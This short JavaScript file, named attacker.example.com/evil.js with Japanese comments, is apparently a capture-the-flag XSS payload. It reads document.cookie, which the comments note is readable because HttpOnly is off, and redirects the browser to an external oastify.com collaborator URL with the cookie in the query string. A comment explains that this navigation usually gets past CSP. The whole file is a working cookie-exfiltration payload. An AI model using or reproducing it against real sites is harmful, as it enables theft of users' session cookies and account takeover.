// attacker.example.com/evil.js
try {
  // 旗は JS から読める（HttpOnly=false）
  const c = document.cookie || '';
  // クッキーをクエリに載せて外部へ「遷移」させる（CSPで通常許可）
  location = 'https://i1kyhw9280hz1z9r797831gap1vsjm7b.oastify.com/?c=' + encodeURIComponent(c);
} catch (e) {}
